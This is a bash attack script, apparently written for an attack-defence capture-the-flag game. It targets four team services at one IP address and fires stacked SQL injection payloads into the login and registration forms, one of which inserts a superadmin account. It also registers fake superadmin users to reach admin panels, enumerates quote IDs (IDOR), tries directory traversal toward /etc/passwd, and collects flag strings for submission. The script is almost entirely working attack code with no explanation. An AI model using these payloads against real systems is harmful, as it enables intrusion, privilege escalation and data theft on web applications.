#!/bin/bash

echo "🔥 CONTINUOUS ATTACK MODE - Escalating offensive operations"

TEAMS=("9001" "9003" "9004" "9005")
BASE_URL="http://54.69.37.82"

# Function to extract all possible flags from a response
extract_flags() {
    local response="$1"
    local team="$2"
    echo "$response" | grep -o '\$FLAG\$[a-f0-9]\{32\}' | while read flag; do
        echo "🚩 CAPTURED FLAG: $flag from Team $team"
        echo "$flag" >> captured_flags_team$team.txt
    done
}

# Advanced SQL injection payloads
sql_payloads=(
    "admin'; SELECT setting_value FROM system_settings WHERE setting_key LIKE '%flag%'; --"
    "admin'; SELECT * FROM org_level_settings; --"
    "admin'; UNION SELECT setting_value,1,1,1,1 FROM system_settings; --"
    "admin'; INSERT INTO users (username, password_hash, user_type) VALUES ('pwned$(date +%s)', 'hash', 'superadmin'); --"
)

for port in "${TEAMS[@]}"; do
    target_url="$BASE_URL:$port"
    team_num=$((port - 9000))
    
    echo ""
    echo "🎯 ADVANCED ATTACK ON TEAM $team_num ($target_url)"
    echo "======================================================="
    
    # Clear previous captures
    rm -f captured_flags_team$team_num.txt
    
    # Multiple SQL injection attempts
    for payload in "${sql_payloads[@]}"; do
        echo "[*] SQL Injection: $payload"
        response=$(curl -s "$target_url/register" \
            -d "username=$payload" \
            -d "password=test123" \
            -d "confirm_password=test123" \
            -d "role=normal" 2>/dev/null)
        extract_flags "$response" "$team_num"
        
        # Also try in login
        login_response=$(curl -s "$target_url/login" \
            -d "username=$payload" \
            -d "password=test123" 2>/dev/null)
        extract_flags "$login_response" "$team_num"
    done
    
    # Try to create multiple admin accounts
    for i in {1..5}; do
        echo "[*] Creating admin account $i..."
        curl -s "$target_url/register" \
            -d "username=hacker$i$(date +%s)" \
            -d "password=password123" \
            -d "confirm_password=password123" \
            -d "role=superadmin" \
            -c "cookies_team${team_num}_$i.txt" > /dev/null
        
        # Try to access admin panel with each account
        admin_resp=$(curl -s -b "cookies_team${team_num}_$i.txt" "$target_url/admin")
        extract_flags "$admin_resp" "$team_num"
        
        # Try orgadmin panel
        orgadmin_resp=$(curl -s -b "cookies_team${team_num}_$i.txt" "$target_url/orgadmin")
        extract_flags "$orgadmin_resp" "$team_num"
        
        # Try to access user pages
        user_resp=$(curl -s -b "cookies_team${team_num}_$i.txt" "$target_url/user")
        extract_flags "$user_resp" "$team_num"
    done
    
    # IDOR attacks on quotes
    echo "[*] IDOR attacks on quotes..."
    for quote_id in {1..20}; do
        quote_resp=$(curl -s "$target_url/quote/$quote_id")
        extract_flags "$quote_resp" "$team_num"
    done
    
    # Try to access system endpoints
    echo "[*] Probing system endpoints..."
    endpoints=("/admin" "/orgadmin" "/user" "/quote/1" "/register" "/login")
    for endpoint in "${endpoints[@]}"; do
        resp=$(curl -s "$target_url$endpoint")
        extract_flags "$resp" "$team_num"
    done
    
    # Directory traversal attempts
    echo "[*] Directory traversal attempts..."
    traversal_paths=("../../../etc/passwd" "../../app/flags.txt" "../flags" "/proc/version")
    for path in "${traversal_paths[@]}"; do
        resp=$(curl -s "$target_url/$path")
        extract_flags "$resp" "$team_num"
    done
    
    # Check for flags in error messages
    echo "[*] Triggering error conditions..."
    error_resp=$(curl -s "$target_url/quote/999999")
    extract_flags "$error_resp" "$team_num"
    
    # Clean up cookies
    rm -f cookies_team${team_num}_*.txt
    
    # Show captured flags for this team
    if [ -f "captured_flags_team$team_num.txt" ]; then
        echo "🏆 FLAGS CAPTURED FROM TEAM $team_num:"
        sort -u "captured_flags_team$team_num.txt"
    else
        echo "❌ No flags captured from Team $team_num"
    fi
done

echo ""
echo "🏴‍☠️ ATTACK SUMMARY"
echo "==================="
for team in 1 3 4 5; do
    if [ -f "captured_flags_team$team.txt" ]; then
        count=$(sort -u "captured_flags_team$team.txt" | wc -l)
        echo "Team $team: $count unique flags captured"
    fi
done

echo ""
echo "📋 ALL CAPTURED FLAGS:"
cat captured_flags_team*.txt 2>/dev/null | sort -u

echo ""
echo "🎯 SUBMIT THESE FLAGS AT: http://54.69.37.82:1337/"
